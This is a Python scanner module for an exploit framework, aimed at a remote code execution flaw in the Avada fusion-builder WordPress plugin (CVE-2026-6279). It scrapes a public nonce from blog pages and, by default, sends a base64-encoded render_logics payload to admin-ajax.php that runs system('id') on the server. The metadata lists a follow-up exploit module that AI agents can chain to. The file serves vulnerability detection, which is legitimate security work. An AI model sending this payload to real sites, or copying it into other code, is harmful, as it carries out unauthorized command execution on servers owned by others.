#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Avada fusion-builder <= 3.15.2 PHP function injection (CVE-2026-6279)."""

import base64
import json
import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "fusion-builder"
_VULN_HIGH = (3, 15, 2)
_NONCE_RE = re.compile(
    r'fusion(?:PostCards|TableOfContents)Vars\s*=\s*\{[^}]*?"nonce"\s*:\s*"([a-f0-9]{8,})"',
    re.I,
)
_PATHS = ("/", "/blog/", "/blog-cards/", "/news/")


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Avada Fusion Builder CVE-2026-6279 detect",
        "description": (
            "Detects fusion_get_widget_markup render_logics call_user_func RCE "
            "(public fusion_load_nonce on post cards pages)."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-6279",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-6279"],
        "modules": ["exploits/multi/http/avada_fusion_cve_2026_6279_rce"],
        "tags": ["web", "scanner", "wordpress", "avada", "rce", "cve-2026-6279"],
        "agent": {
            "approval_required": True,
            "chain": {
                "suggested_followups": ["exploits/multi/http/avada_fusion_cve_2026_6279_rce"],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)
    active_probe = OptBool(True, "POST system(id) via render_logics", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _nonce(self) -> str:
        for rel in _PATHS:
            page = self.http_request(method="GET", path=self._join(rel), allow_redirects=True)
            if not page:
                continue
            m = _NONCE_RE.search(page.text or "")
            if m:
                return m.group(1)
        return ""

    def run(self):
        base = self.wp_normalize_base_path(self.base_path or "/")
        version = self.wp_plugin_version(_PLUGIN, base) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        nonce = self._nonce()
        if not nonce:
            return False
        if not self.active_probe:
            self.set_info(
                severity="high",
                reason="Fusion Builder public fusion_load_nonce found",
                cve="CVE-2026-6279",
            )
            return True
        logic = json.dumps(
            {"type": "wp_conditional_tags", "value": {"function": "system", "args": "id"}},
            separators=(",", ":"),
        )
        b64 = base64.b64encode(logic.encode()).decode()
        resp = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "X-Requested-With": "XMLHttpRequest",
            },
            data={
                "action": "fusion_get_widget_markup",
                "fusion_load_nonce": nonce,
                "widget_type": "WP_Widget_Recent_Posts",
                "type": "WP_Widget_Recent_Posts",
                "widget_id": "2",
                "number": "2",
                "render_logics": b64,
            },
            allow_redirects=False,
        )
        body = resp.text or "" if resp else ""
        if resp and int(resp.status_code or 0) == 200 and "uid=" in body and "gid=" in body:
            self.set_info(
                severity="critical",
                reason="fusion_get_widget_markup call_user_func RCE",
                path="/wp-admin/admin-ajax.php",
                cve="CVE-2026-6279",
            )
            return True
        return False
